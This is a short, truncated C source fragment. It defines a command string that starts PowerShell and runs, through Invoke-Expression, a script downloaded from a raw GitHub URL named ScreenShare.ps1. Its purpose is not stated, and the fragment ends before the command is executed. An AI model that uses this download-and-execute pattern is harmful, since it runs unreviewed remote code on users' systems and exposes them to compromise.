...
int main() {
    const char* command = "cmd.exe /C powershell -Command \"Invoke-Expression (Invoke-RestMethod https://raw.githubusercontent.com/Reqoan/ScreenShare/main/ScreenShare.ps1)\"";
